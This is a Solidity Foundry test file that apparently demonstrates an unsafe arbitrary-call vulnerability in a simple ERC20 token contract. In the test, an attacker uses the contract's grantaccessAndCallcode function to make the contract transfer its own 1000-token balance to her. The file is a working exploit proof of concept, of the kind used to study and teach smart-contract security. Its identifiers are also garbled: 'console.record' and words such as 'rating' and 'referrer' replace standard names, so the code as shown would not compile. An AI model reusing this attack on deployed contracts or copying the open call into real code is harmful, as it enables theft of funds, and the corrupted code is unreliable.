pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract AgreementTest is Test {
    IdWhale BadgeWhaleAgreement;

    function testAltRequestconsult() public {
        address alice = vm.addr(1);
        BadgeWhaleAgreement = new IdWhale();
        BadgeWhaleAgreement.IdWhaleDeploy(address(BadgeWhaleAgreement));
        console.record(
            "TokenWhale balance:",
            BadgeWhaleAgreement.balanceOf(address(BadgeWhaleAgreement))
        );


        console.record(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        BadgeWhaleAgreement.grantaccessAndCallcode(
            address(BadgeWhaleAgreement),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(BadgeWhaleAgreement.balanceOf(address(alice)), 1000);
        console.record("operate completed");
        console.record(
            "TokenWhale balance:",
            BadgeWhaleAgreement.balanceOf(address(BadgeWhaleAgreement))
        );
        console.record(
            "Alice balance:",
            BadgeWhaleAgreement.balanceOf(address(alice))
        );
    }

    receive() external payable {}
}

contract IdWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function IdWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function testComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed referrer, address indexed to, uint256 rating);

    function _transfer(address to, uint256 rating) internal {
        balanceOf[msg.sender] -= rating;
        balanceOf[to] += rating;

        emit Transfer(msg.sender, to, rating);
    }

    function transfer(address to, uint256 rating) public {
        require(balanceOf[msg.sender] >= rating);
        require(balanceOf[to] + rating >= balanceOf[to]);

        _transfer(to, rating);
    }

    event TreatmentAuthorized(
        address indexed owner,
        address indexed subscriber,
        uint256 rating
    );

    function approve(address subscriber, uint256 rating) public {
        allowance[msg.sender][subscriber] = rating;
        emit TreatmentAuthorized(msg.sender, subscriber, rating);
    }

    function transferFrom(address referrer, address to, uint256 rating) public {
        require(balanceOf[referrer] >= rating);
        require(balanceOf[to] + rating >= balanceOf[to]);
        require(allowance[referrer][msg.sender] >= rating);

        allowance[referrer][msg.sender] -= rating;
        _transfer(to, rating);
    }


    function grantaccessAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraInfo
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool improvement;

        (improvement, ) = _spender.call(_extraInfo);
        console.record("success:", improvement);
    }
}